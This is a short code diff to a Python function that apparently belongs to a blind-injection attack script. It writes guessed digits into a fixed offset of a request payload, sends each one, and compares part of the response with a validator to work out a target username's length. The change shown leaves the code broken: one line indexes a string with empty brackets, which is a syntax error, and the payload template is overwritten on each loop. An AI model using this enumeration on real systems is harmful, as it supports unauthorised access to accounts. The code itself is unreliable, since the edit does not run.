@@ -38,13 +38,13 @@ def username_length_finder(payload, validator):
     while (response == False):
         list_payload = list(payload)
         list_payload[83] = str(i)
-        payload_1 = "".join(list_payload)
+        payload = "".join(list_payload)
 
         print(payload)
         response_text = get_requester(payload)
         response_formatted_text = text_formatter(response_text)
 
-        if (validator == response_formatted_text[505:513]):
+        if (validator == response_formatted_text[]):
             response = True
             username_length = i
         else:
